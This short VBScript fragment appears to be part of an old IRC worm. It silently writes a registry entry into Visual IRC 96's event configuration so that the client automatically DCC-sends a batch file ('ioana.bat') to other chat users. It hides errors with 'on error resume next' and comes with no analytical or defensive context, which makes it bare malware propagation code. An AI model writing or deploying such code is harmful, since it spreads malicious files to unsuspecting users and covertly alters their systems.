on error resume next
set ws = CreateObject("wscript.shell")
ws.regwrite "HKEY_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17","dcc send $nick c:\windows\system\ioana\ioana.bat"
